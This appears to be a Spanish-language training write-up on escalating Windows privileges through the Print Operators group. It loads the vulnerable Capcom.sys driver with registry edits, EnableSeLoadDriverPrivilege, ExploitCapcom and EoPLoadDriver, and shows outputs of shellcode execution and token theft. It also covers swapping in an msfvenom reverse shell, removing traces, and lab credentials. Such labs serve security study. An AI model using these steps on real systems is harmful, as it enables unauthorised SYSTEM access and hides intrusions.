
# Print Operators

[Los operadores de impresión](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) son otro grupo con muchos privilegios, que otorga a sus miembros los derechos `SeLoadDriverPrivilege` para administrar, crear, compartir y eliminar impresoras conectadas a un controlador de dominio, así como la capacidad de iniciar sesión localmente en un controlador de dominio y apagarlo. Si emitimos el comando `whoami /priv` y no vemos el `SeLoadDriverPrivilege` desde un contexto no elevado, necesitaremos omitir el UAC.

## &#x20;<mark style="color:purple;">Explotación con interfaz gráfica</mark>

### **Confirmando privilegios**

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name           Description                          State
======================== =================================    =======
SeIncreaseQuotaPrivilege Adjust memory quotas for a process   Disabled
SeChangeNotifyPrivilege  Bypass traverse checking             Enabled
SeShutdownPrivilege      Shut down the system                 Disabled
```

#### **Comprobando nuevamente los privilegios**

El repositorio [de UACMe](https://github.com/hfiref0x/UACME) incluye una lista completa de omisiones de UAC, que se pueden utilizar desde la línea de comandos. Alternativamente, desde una GUI, podemos abrir un shell de comandos administrativos e ingresar las credenciales de la cuenta que es miembro del grupo Operadores de impresión. Si examinamos los privilegios nuevamente, `SeLoadDriverPrivilege` está visible pero deshabilitado.

```powershell
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================  ==========
SeMachineAccountPrivilege     Add workstations to domain           Disabled
SeLoadDriverPrivilege         Load and unload device drivers       Disabled
SeShutdownPrivilege           Shut down the system			       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
```

Es bien sabido que el controlador `Capcom.sys` contiene una funcionalidad que permite a cualquier usuario ejecutar código shell con privilegios de SYSTEM. Podemos usar nuestros privilegios para cargar este controlador vulnerable y escalar privilegios. Podemos usar [esta](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) herramienta para cargar el controlador. La PoC habilita el privilegio y también carga el controlador por nosotros.

Descárguelo localmente y edítelo, pegándolo sobre los archivos incluidos a continuación.

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

A continuación, desde el CMD para desarrolladores de Visual Studio 2019, compílelo usando **cl.exe** .

### **Compilar con cl.exe**

```powershell
C:\Users\mrb3n\Desktop\Print Operators> cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

Microsoft (R) C/C++ Optimizing Compiler Version 19.28.29913 for x86
Copyright (C) Microsoft Corporation.  All rights reserved.

EnableSeLoadDriverPrivilege.cpp
Microsoft (R) Incremental Linker Version 14.28.29913.0
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:EnableSeLoadDriverPrivilege.exe
EnableSeLoadDriverPrivilege.obj
```

### **Agregar referencia al controlador**

A continuación, descargue el `Capcom.sys`controlador desde [aquí](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) y guárdelo en `C:\temp`. Ejecute los comandos siguientes para agregar una referencia a este controlador en nuestro árbol HKEY\_CURRENT\_USER.

```powershell
C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"

The operation completed successfully.


C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1

The operation completed successfully.
```

La sintaxis extraña `\??\`que se utiliza para hacer referencia a la ruta de imagen de nuestro controlador malicioso es una [ruta de objeto NT](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/c1550f98-a1ce-426a-9991-7509e7c3787c) . La API Win32 analizará y resolverá esta ruta para localizar y cargar correctamente nuestro controlador malicioso.

### **Verificar que el controlador no esté cargado**

[Usando DriverView.exe](http://www.nirsoft.net/utils/driverview.html) de Nirsoft , podemos verificar que el controlador Capcom.sys no esté cargado.

```powershell-session
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
```

### **Verificar que el privilegio esté habilitado**

Ejecute el binario `EnableSeLoadDriverPrivilege.exe`.

```powershell
C:\htb> EnableSeLoadDriverPrivilege.exe

whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege        Disabled
SeLoadDriverPrivilege            Enabled
SeShutdownPrivilege              Disabled
SeChangeNotifyPrivilege          Enabled by default
SeIncreaseWorkingSetPrivilege    Disabled
NTSTATUS: 00000000, WinError: 0
```

### **Verificar  que el controlador de Capcom esté en la lista**

A continuación, verifique que el controlador de Capcom ahora aparezca en la lista.

```powershell
PS C:\htb> .\DriverView.exe /stext drivers.txt
PS C:\htb> cat drivers.txt | Select-String -pattern Capcom

Driver Name           : Capcom.sys
Filename              : C:\Tools\Capcom.sys
```

### **ExploitCapcom para aumentar los privilegios**

Para explotar el Capcom.sys, podemos utilizar la herramienta [ExploitCapcom](https://github.com/tandasat/ExploitCapcom) después de compilar con Visual Studio.

```powershell-session
PS C:\htb> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obained as 0000000000000070
[*] Shellcode was placed at 0000024822A50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
```

Esto lanza un shell con privilegios de SYSTEM.

![Explotación de impresiones](https://academy.hackthebox.com/storage/modules/67/capcomexploit.png)

***

## <mark style="color:purple;">Explotación alternativa: sin interfaz gráfica de usuario</mark>

Si no tenemos acceso GUI al objetivo, tendremos que modificar el código de `ExploitCapcom.cpp` antes de compilar. Aquí podemos editar la línea 292 y reemplazarla con `"C:\\Windows\\system32\\cmd.exe"`, digamos, un binario de reverse shell creado con `msfvenom`, por ejemplo: `c:\ProgramData\revshell.exe`.

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

La string `CommandLine` en este ejemplo se cambiaría a:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

Configuraríamos un receptor en función del payload que generamos con `msfvenom` y, con suerte, recibiríamos una conexión de shell reversa al ejecutar `ExploitCapcom.exe`. Si una conexión de shell reversa se bloquea por algún motivo, podemos intentar un payload de usuario de bind shell o exec/add.

***

## <mark style="color:purple;">Automatizar los pasos</mark>

**Automatización con EopLoadDriver**

Podemos utilizar una herramienta como [EoPLoadDriver](https://github.com/TarlogicSecurity/EoPLoadDriver/) para automatizar el proceso de habilitar el privilegio, crear la clave de registro y ejecutar la carga  `NTLoadDriver` del controlador. Para ello, ejecutaríamos lo siguiente:

```powershell
C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys

[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-454284637-3659702366-2958135535-1103\System\CurrentControlSet\Capcom
NTSTATUS: c000010e, WinError: 0
```

Luego correríamos `ExploitCapcom.exe` para abrir un shell de SYSTEM o ejecutaríamos nuestro binario personalizado.

***

## <mark style="color:purple;">Limpieza</mark>

### **Eliminar clave de registro**

Podemos cubrir un poco nuestras huellas eliminando la clave de registro agregada anteriormente.

```cmd-session
C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom

Permanently delete the registry key HKEY_CURRENT_USER\System\CurrentControlSet\Capcom (Yes/No)? Yes

The operation completed successfully.
```

{% hint style="warning" %}
**Nota**: Desde Windows 10 versión 1803, el "`SeLoadDriverPrivilege`" no se puede explotar, ya que ya no es posible incluir referencias a claves de registro en "HKEY\_CURRENT\_USER".
{% endhint %}

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.31 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "printsvc" y la contraseña "HTB_@cademy_stdnt!"
```

> Siga los pasos de esta sección para escalar privilegios a SYSTEM y enviar el contenido del archivo flag.txt del escritorio del administrador. Las herramientas necesarias para ambos métodos se pueden encontrar en el directorio `C:\Tools`, o puede practicar compilándolas y cargándolas por su cuenta.

#### Herramientas

```warpscript
PS C:\tools> ls

    Directory: C:\tools


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/24/2021   3:11 PM                ExploitCapcom
-a----        5/24/2021   3:12 PM          10576 Capcom.sys
-a----        5/24/2021   3:11 PM          44920 DriverView.exe
-a----        5/24/2021   3:11 PM         119808 EnableSeLoadDriverPrivilege.exe
-a----        5/24/2021   5:25 PM          15360 EoPLoadDriver.exe
```

#### Comprobar privilegios del usuario

Abrimos una Powershell como administrador. Necesitamos introducir las credenciales del usuario printsvc:

<figure><img src="/files/09Hh7OnIH5HndYMxK8D6" alt=""><figcaption></figcaption></figure>

<pre class="language-powershell"><code class="lang-powershell"><strong>PS C:\Windows\system32> whoami /priv
</strong>
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeLoadDriverPrivilege         Load and unload device drivers Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
</code></pre>

Tenemos el `SeLoadPrivilege` deshabilitado por lo que tenemos que habilitarlo.

#### Agregar referencia al controlador

```
C:\Tools> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
Value ImagePath exists, overwrite(Yes/No)? Yes
The operation completed successfully.
```

#### Habilitar SeLoadPrivilege

```
C:\Tools>EnableSeLoadDriverPrivilege.exe
whoami:
INLANEFREIGHT0\printsvc

whoami /priv
SeMachineAccountPrivilege                         Disabled
SeLoadDriverPrivilege                             Enabled
SeShutdownPrivilege                               Disabled
SeChangeNotifyPrivilege                           Enabled by default
SeIncreaseWorkingSetPrivilege                     Disabled
NTSTATUS: c000010e, WinError: 0
```

#### Verificar que el controlador Capcom está en la lista

```powershell
PS C:\tools> .\DriverView.exe /stext drivers.txt
PS C:\tools> cat drivers.txt | Select-String -pattern Capcom

Driver Name       : Capcom.sys
Filename          : c:\Tools\Capcom.sys
```

#### Exploit Capcom para aumentar los privilegios

```powershell
PS C:\tools\ExploitCapcom> .\ExploitCapcom.exe

[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000070
[*] Shellcode was placed at 00000277C9D50008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```

<figure><img src="/files/CTujZ5dQZNHVEyURtwNU" alt=""><figcaption></figcaption></figure>

Somos SYSTEM!

#### Acceso a la flag

<figure><img src="/files/AerrLqVONJthJKQOuNoD" alt=""><figcaption></figcaption></figure>
